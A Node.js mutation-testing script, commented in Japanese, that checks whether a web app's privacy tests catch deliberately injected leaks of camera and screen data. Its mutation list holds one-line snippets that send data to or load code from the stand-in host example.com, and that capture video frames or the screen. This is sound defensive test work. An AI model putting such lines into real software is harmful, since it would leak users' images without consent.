// 検査の検査。プライバシー試験(test/privacy.test.mjs)に、わざと不良を 1 件ずつ入れた写しを流し、本当に落ちるか確かめる。
//   node scripts/mutation-check.mjs
// 落ちるべき不良が通ってしまったら「穴」。穴は試験を直して塞ぎ、ここの表にも残す。
import { cpSync, mkdtempSync, appendFileSync, rmSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { spawnSync } from 'node:child_process';

const WEB = join(dirname(fileURLToPath(import.meta.url)), '..');

// [名前, 入れる先(src からの相対), 足す行]。全部「画像や映像が外へ出る」不良で、試験が落ちなければならない。
const MUTATIONS = [
  ['画面の絵を data URL にする', 'main.js', "\nconst leak1 = document.createElement('canvas').toDataURL();\n"],
  ['画面の絵を Blob にする', 'main.js', "\ndocument.createElement('canvas').toBlob(() => {});\n"],
  ['外のサーバーへ fetch', 'ui/panel.js', "\nfetch('https://example.com/collect');\n"],
  ['許可していない自分の道(/api/upload)へ fetch', 'ui/panel.js', "\nfetch('/api/upload');\n"],
  ['追従のコードが fetch', 'tracking/geometry.js', "\nfetch('/api/status');\n"],
  ['映像を canvas に描く', 'tracking/faceTracker.js', "\nconst c = document.createElement('canvas').getContext('2d'); c.drawImage(video, 0, 0);\n"],
  ['WebSocket を開く', 'conversation/speaker.js', "\nnew WebSocket('wss://example.com');\n"],
  ['sendBeacon', 'main.js', "\nnavigator.sendBeacon('/x', 'y');\n"],
  ['MediaRecorder で録る', 'tracking/faceTracker.js', "\nnew MediaRecorder(stream);\n"],
  // ここから下は、最初は穴だったかもしれない書き方(見つけたら試験を直す)
  ['変数の宛先へ fetch', 'ui/panel.js', "\nconst dest = 'https://example.com/collect'; fetch(dest);\n"],
  ['画像のピクセルに送る(new Image().src)', 'ui/panel.js', "\nnew Image().src = 'https://example.com/p.gif?d=1';\n"],
  ['EventSource で外へつなぐ', 'conversation/brainClient.js', "\nnew EventSource('https://example.com/e');\n"],
  ['動的 import で外のコードを読む', 'main.js', "\nimport('https://example.com/x.js');\n"],
  ['静止画を撮る(ImageCapture)', 'tracking/faceTracker.js', "\nnew ImageCapture(track).grabFrame();\n"],
  ['画面の共有(getDisplayMedia)', 'main.js', "\nnavigator.mediaDevices.getDisplayMedia({video:true});\n"],
  ['Worker に外のコード', 'main.js', "\nnew Worker('https://example.com/w.js');\n"],
  ['送る本文に画像の名前', 'conversation/dialogue.js', null], // 本文の中に足す(下で処理)
];

function run(dir) {
  const r = spawnSync(process.execPath, ['--test', join(dir, 'test', 'privacy.test.mjs')], { encoding: 'utf8', timeout: 60_000 });
  return r.status === 0;
}

const root = mkdtempSync(join(tmpdir(), 'mut-'));
let holes = 0;
const rows = [];
try {
  // まず、元のままで通ることを確かめる(通らなければ、落ちた理由が不良のせいと言えない)
  const base = join(root, 'base');
  mkdirSync(join(base, 'test'), { recursive: true });
  cpSync(join(WEB, 'src'), join(base, 'src'), { recursive: true });
  cpSync(join(WEB, 'test', 'privacy.test.mjs'), join(base, 'test', 'privacy.test.mjs'));
  if (!run(base)) throw new Error('元のままでも試験が落ちます。先に直してください');

  MUTATIONS.forEach(([name, rel, add], i) => {
    const dir = join(root, `m${i}`);
    mkdirSync(join(dir, 'test'), { recursive: true });
    cpSync(join(WEB, 'src'), join(dir, 'src'), { recursive: true });
    cpSync(join(WEB, 'test', 'privacy.test.mjs'), join(dir, 'test', 'privacy.test.mjs'));
    const target = join(dir, 'src', rel);
    if (add === null) {
      const s = readFileSync(target, 'utf8');
      writeFileSync(target, s.replace('const body = {', 'const body = {\n      frameJpeg: null,'));
    } else {
      appendFileSync(target, add);
    }
    const caught = !run(dir);
    if (!caught) holes += 1;
    rows.push(`${caught ? '○ 落ちた' : '× 通った(穴)'}  ${name}`);
  });
} finally {
  rmSync(root, { recursive: true, force: true });
}
console.log(rows.join('\n'));
console.log(`\n${MUTATIONS.length} 件中、穴 ${holes} 件`);
process.exit(holes ? 1 : 0);
